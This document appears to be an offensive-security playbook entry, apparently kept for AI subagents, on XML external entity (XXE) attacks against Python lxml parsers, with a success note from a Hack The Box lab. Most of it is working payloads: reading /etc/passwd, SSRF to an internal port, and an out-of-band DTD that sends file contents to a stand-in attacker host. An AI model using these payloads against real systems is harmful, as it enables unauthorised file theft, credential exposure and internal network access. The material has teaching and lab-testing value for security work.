# XXE via Python lxml Entity Resolution

## When to use

- Target application parses XML input using Python's lxml library
- lxml is configured with `resolve_entities=True` (the default for some parsers)
- Goal: read files from the server, SSRF, or exfiltrate data via out-of-band channels

## Tags

- ATT&CK: T1190 (Exploit Public-Facing Application), T1005 (Data from Local System)
- Platform: Linux, Windows
- Services: web applications, API endpoints accepting XML
- Privileges: unauthenticated (if XML endpoint is public)

## How it works

Python's lxml library wraps libxml2, which supports XML entity resolution by default
in certain parser configurations. When `resolve_entities=True`, external entity
declarations (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`) are processed and their
content is substituted into the parsed document.

Unlike Python's built-in `xml.etree.ElementTree` (which ignores external entities by
default), lxml's `etree.XMLParser()` resolves entities unless explicitly disabled with
`resolve_entities=False`.

## Detection

Look for endpoints accepting XML input:
- Content-Type: `application/xml`, `text/xml`
- File upload endpoints accepting XML, SVG, DOCX, XLSX
- SOAP/WSDL services
- Data ingestion pipelines (AIDX, EDI, RSS)

Test with a basic entity:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>
```

## Exploitation

### Basic file read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### Reading multi-line files (PHP wrapper equivalent for Python)

lxml handles multi-line files natively. No wrapper needed unlike PHP.

### SSRF to internal services

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:9092/">
]>
<data>&xxe;</data>
```

### Out-of-band exfiltration (when response is not reflected)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://<attacker>/evil.dtd">
  %dtd;
]>
<data>&send;</data>
```

`evil.dtd`:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://<attacker>/?data=%file;'>">
%all;
```

## Operational notes

**False negatives from automated tools.** On Stream, subagents reported XXE was
blocked when it worked fine with standard payloads. Always verify manually before
concluding XXE is patched.

**lxml parser modes matter.** `etree.parse()` and `etree.XMLParser()` resolve
entities by default. `etree.fromstring()` with a custom parser that sets
`resolve_entities=False` blocks it. Check the source if available.

**Kafka/streaming pipelines.** XML ingestion in streaming architectures (Kafka,
RabbitMQ, Pulsar) often uses lxml because it's faster than the stdlib. The XML
is parsed at the consumer, so the XXE executes on the consumer host, not the
producer or broker.

## Proven on

- Python lxml in Kafka AIDX consumer (HTB Stream, 2026-10-12): standard XXE payload read Kafka SASL config with broker credentials
